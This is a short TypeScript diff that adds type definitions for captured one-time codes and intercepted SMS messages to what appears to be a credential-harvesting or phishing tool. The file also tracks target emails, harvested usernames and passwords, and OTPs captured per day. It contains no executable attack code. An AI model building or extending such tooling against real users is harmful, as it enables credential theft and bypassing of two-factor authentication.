@@ -117,6 +117,32 @@ export interface MonitorStats {
   otps_captured_24h: number;
 }
 
+export interface CapturedOTPRecord {
+  id: string;
+  target_id: string;
+  target_email: string;
+  session_id: string | null;
+  sender: string | null;
+  subject: string | null;
+  body_snippet: string | null;
+  extracted_code: string;
+  confidence: string | null;
+  channel: string;
+  received_at: string;
+  is_read: boolean;
+}
+
+export interface InterceptedSMSRecord {
+  id: string;
+  target_id: string | null;
+  target_email: string;
+  sender: string | null;
+  recipient: string | null;
+  body: string;
+  message_sid: string | null;
+  received_at: string;
+}
+
 export interface HarvestSubmit {
   username: string;
   password: string;
@@ -131,3 +157,4 @@ export interface HarvestResponse {
   session_id: string;
   message: string;
 }
+
